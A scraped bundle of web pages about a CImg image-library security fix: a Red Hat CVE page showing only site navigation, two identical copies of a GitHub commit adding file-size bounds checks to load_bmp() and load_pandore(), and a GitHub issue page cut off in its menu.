=== Content from access.redhat.com_2f14ffd8_20250115_181203.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Fran√ßais](https://access.redhat.com/changeLanguage?language=fr)
* [ÌïúÍµ≠Ïñ¥](https://access.redhat.com/changeLanguage?language=ko)
* [Êó•Êú¨Ë™û](https://access.redhat.com/changeLanguage?language=ja)
* [‰∏≠Êñá (‰∏≠ÂõΩ)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 ¬© 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from github.com_f960656c_20250115_120210.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fcommit%2F619cb58dd90b4e03ac68286c70ed98acbefd1c90)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fcommit%2F619cb58dd90b4e03ac68286c70ed98acbefd1c90)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=GreycLab%2FCImg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GreycLab](/GreycLab)
/
**[CImg](/GreycLab/CImg)**
Public

* [Notifications](/login?return_to=%2FGreycLab%2FCImg) You must be signed in to change notification settings
* [Fork
  286](/login?return_to=%2FGreycLab%2FCImg)
* [Star
   1.5k](/login?return_to=%2FGreycLab%2FCImg)

* [Code](/GreycLab/CImg)
* [Issues
  84](/GreycLab/CImg/issues)
* [Pull requests
  0](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects
  0](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

Additional navigation options

* [Code](/GreycLab/CImg)
* [Issues](/GreycLab/CImg/issues)
* [Pull requests](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

## Commit

[Permalink](/GreycLab/CImg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

CImg<>::load\_bmp() and CImg<>::load\_pandore(): Check that dimensions ‚Ä¶

[Browse files](/GreycLab/CImg/tree/619cb58dd90b4e03ac68286c70ed98acbefd1c90)
Browse the repository at this point in the history

```
‚Ä¶encoded in file does not exceed file size.
```

* Loading branch information

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=40&v=4)](/dtschump)

[dtschump](/GreycLab/CImg/commits?author=dtschump "View all commits by dtschump")
committed
Apr 7, 2022

1 parent
[d0f152d](/GreycLab/CImg/commit/d0f152d53aff1d8cb002e05af7f13b93d6dce7e1)

commit 619cb58

Showing
**1 changed file**
with
**13 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

13 changes: 13 additions & 0 deletions

13
[CImg.h](#diff-251efc4f50c759a149181be24f173c657d92c16ff31dd56251bf59dbca26e360 "CImg.h")

Show comments

[View file](/GreycLab/CImg/blob/619cb58dd90b4e03ac68286c70ed98acbefd1c90/CImg.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -53184,6 +53184,7 @@ namespace cimg\_library\_suffixed { |
|  |  | "load\_bmp(): Specified filename is (null).", |
|  |  | cimg\_instance); |
|  |  |  |
|  |  | const ulongT fsiz = file?cimg::type<ulongT>::max():(ulongT)cimg::fsize(filename); |
|  |  | std::FILE \*const nfile = file?file:cimg::fopen(filename,"rb"); |
|  |  | CImg<ucharT> header(54); |
|  |  | cimg::fread(header.\_data,54,nfile); |
| Expand Down  Expand Up | | @@ -53220,6 +53221,12 @@ namespace cimg\_library\_suffixed { |
|  |  | cimg\_iobuffer = (ulongT)24\*1024\*1024, |
|  |  | buf\_size = (ulongT)cimg::abs(dy)\*(dx\_bytes + align\_bytes); |
|  |  |  |
|  |  | if (buf\_size>fsiz) |
|  |  | throw CImgIOException(\_cimg\_instance |
|  |  | "load\_bmp(): File size %lu for filename '%s' does not match encoded image dimensions (%d,%d).", |
|  |  | cimg\_instance, |
|  |  | (long)fsiz,filename?filename:"(FILE\*)",dx,dy); |
|  |  |  |
|  |  | CImg<intT> colormap; |
|  |  | if (bpp<16) { if (!nb\_colors) nb\_colors = 1<<bpp; } else nb\_colors = 0; |
|  |  | if (nb\_colors) { colormap.assign(nb\_colors); cimg::fread(colormap.\_data,nb\_colors,nfile); } |
| Expand Down  Expand Up | | @@ -55026,6 +55033,11 @@ namespace cimg\_library\_suffixed { |
|  |  | #define \_\_cimg\_load\_pandore\_case(nbdim,nwidth,nheight,ndepth,ndim,stype) \ |
|  |  | cimg::fread(dims,nbdim,nfile); \ |
|  |  | if (endian) cimg::invert\_endianness(dims,nbdim); \ |
|  |  | if ((ulongT)nwidth\*nheight\*ndepth\*ndim>fsiz) \ |
|  |  | throw CImgIOException(\_cimg\_instance \ |
|  |  | "load\_pandore(): File size %lu for filename '%s' does not match encoded image dimensions (%d,%d,%d,%d).",\ |
|  |  | cimg\_instance,\ |
|  |  | (long)fsiz,filename?filename:"(FILE\*)",(int)nwidth,(int)nheight,(int)ndepth,(int)ndim); \ |
|  |  | assign(nwidth,nheight,ndepth,ndim); \ |
|  |  | const size\_t siz = size(); \ |
|  |  | stype \*buffer = new stype[siz]; \ |
| Expand All | | @@ -55049,6 +55061,7 @@ namespace cimg\_library\_suffixed { |
|  |  | "load\_pandore(): Specified filename is (null).", |
|  |  | cimg\_instance); |
|  |  |  |
|  |  | const ulongT fsiz = file?cimg::type<ulongT>::max():(ulongT)cimg::fsize(filename); |
|  |  | std::FILE \*const nfile = file?file:cimg::fopen(filename,"rb"); |
|  |  | CImg<charT> header(32); |
|  |  | cimg::fread(header.\_data,12,nfile); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `619cb58`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fcommit%2F619cb58dd90b4e03ac68286c70ed98acbefd1c90) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_e932112c_20250114_201558.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fcommit%2F619cb58dd90b4e03ac68286c70ed98acbefd1c90)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fcommit%2F619cb58dd90b4e03ac68286c70ed98acbefd1c90)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=GreycLab%2FCImg)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GreycLab](/GreycLab)
/
**[CImg](/GreycLab/CImg)**
Public

* [Notifications](/login?return_to=%2FGreycLab%2FCImg) You must be signed in to change notification settings
* [Fork
  286](/login?return_to=%2FGreycLab%2FCImg)
* [Star
   1.5k](/login?return_to=%2FGreycLab%2FCImg)

* [Code](/GreycLab/CImg)
* [Issues
  84](/GreycLab/CImg/issues)
* [Pull requests
  0](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects
  0](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

Additional navigation options

* [Code](/GreycLab/CImg)
* [Issues](/GreycLab/CImg/issues)
* [Pull requests](/GreycLab/CImg/pulls)
* [Actions](/GreycLab/CImg/actions)
* [Projects](/GreycLab/CImg/projects)
* [Wiki](/GreycLab/CImg/wiki)
* [Security](/GreycLab/CImg/security)
* [Insights](/GreycLab/CImg/pulse)

## Commit

[Permalink](/GreycLab/CImg/commit/619cb58dd90b4e03ac68286c70ed98acbefd1c90)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

CImg<>::load\_bmp() and CImg<>::load\_pandore(): Check that dimensions ‚Ä¶

[Browse files](/GreycLab/CImg/tree/619cb58dd90b4e03ac68286c70ed98acbefd1c90)
Browse the repository at this point in the history

```
‚Ä¶encoded in file does not exceed file size.
```

* Loading branch information

[![@dtschump](https://avatars.githubusercontent.com/u/10114565?s=40&v=4)](/dtschump)

[dtschump](/GreycLab/CImg/commits?author=dtschump "View all commits by dtschump")
committed
Apr 7, 2022

1 parent
[d0f152d](/GreycLab/CImg/commit/d0f152d53aff1d8cb002e05af7f13b93d6dce7e1)

commit 619cb58

Showing
**1 changed file**
with
**13 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

13 changes: 13 additions & 0 deletions

13
[CImg.h](#diff-251efc4f50c759a149181be24f173c657d92c16ff31dd56251bf59dbca26e360 "CImg.h")

Show comments

[View file](/GreycLab/CImg/blob/619cb58dd90b4e03ac68286c70ed98acbefd1c90/CImg.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -53184,6 +53184,7 @@ namespace cimg\_library\_suffixed { |
|  |  | "load\_bmp(): Specified filename is (null).", |
|  |  | cimg\_instance); |
|  |  |  |
|  |  | const ulongT fsiz = file?cimg::type<ulongT>::max():(ulongT)cimg::fsize(filename); |
|  |  | std::FILE \*const nfile = file?file:cimg::fopen(filename,"rb"); |
|  |  | CImg<ucharT> header(54); |
|  |  | cimg::fread(header.\_data,54,nfile); |
| Expand Down  Expand Up | | @@ -53220,6 +53221,12 @@ namespace cimg\_library\_suffixed { |
|  |  | cimg\_iobuffer = (ulongT)24\*1024\*1024, |
|  |  | buf\_size = (ulongT)cimg::abs(dy)\*(dx\_bytes + align\_bytes); |
|  |  |  |
|  |  | if (buf\_size>fsiz) |
|  |  | throw CImgIOException(\_cimg\_instance |
|  |  | "load\_bmp(): File size %lu for filename '%s' does not match encoded image dimensions (%d,%d).", |
|  |  | cimg\_instance, |
|  |  | (long)fsiz,filename?filename:"(FILE\*)",dx,dy); |
|  |  |  |
|  |  | CImg<intT> colormap; |
|  |  | if (bpp<16) { if (!nb\_colors) nb\_colors = 1<<bpp; } else nb\_colors = 0; |
|  |  | if (nb\_colors) { colormap.assign(nb\_colors); cimg::fread(colormap.\_data,nb\_colors,nfile); } |
| Expand Down  Expand Up | | @@ -55026,6 +55033,11 @@ namespace cimg\_library\_suffixed { |
|  |  | #define \_\_cimg\_load\_pandore\_case(nbdim,nwidth,nheight,ndepth,ndim,stype) \ |
|  |  | cimg::fread(dims,nbdim,nfile); \ |
|  |  | if (endian) cimg::invert\_endianness(dims,nbdim); \ |
|  |  | if ((ulongT)nwidth\*nheight\*ndepth\*ndim>fsiz) \ |
|  |  | throw CImgIOException(\_cimg\_instance \ |
|  |  | "load\_pandore(): File size %lu for filename '%s' does not match encoded image dimensions (%d,%d,%d,%d).",\ |
|  |  | cimg\_instance,\ |
|  |  | (long)fsiz,filename?filename:"(FILE\*)",(int)nwidth,(int)nheight,(int)ndepth,(int)ndim); \ |
|  |  | assign(nwidth,nheight,ndepth,ndim); \ |
|  |  | const size\_t siz = size(); \ |
|  |  | stype \*buffer = new stype[siz]; \ |
| Expand All | | @@ -55049,6 +55061,7 @@ namespace cimg\_library\_suffixed { |
|  |  | "load\_pandore(): Specified filename is (null).", |
|  |  | cimg\_instance); |
|  |  |  |
|  |  | const ulongT fsiz = file?cimg::type<ulongT>::max():(ulongT)cimg::fsize(filename); |
|  |  | std::FILE \*const nfile = file?file:cimg::fopen(filename,"rb"); |
|  |  | CImg<charT> header(32); |
|  |  | cimg::fread(header.\_data,12,nfile); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `619cb58`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fcommit%2F619cb58dd90b4e03ac68286c70ed98acbefd1c90) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_d5a98bc6_20250115_120207.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGreycLab%2FCImg%2Fissues%2F343)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
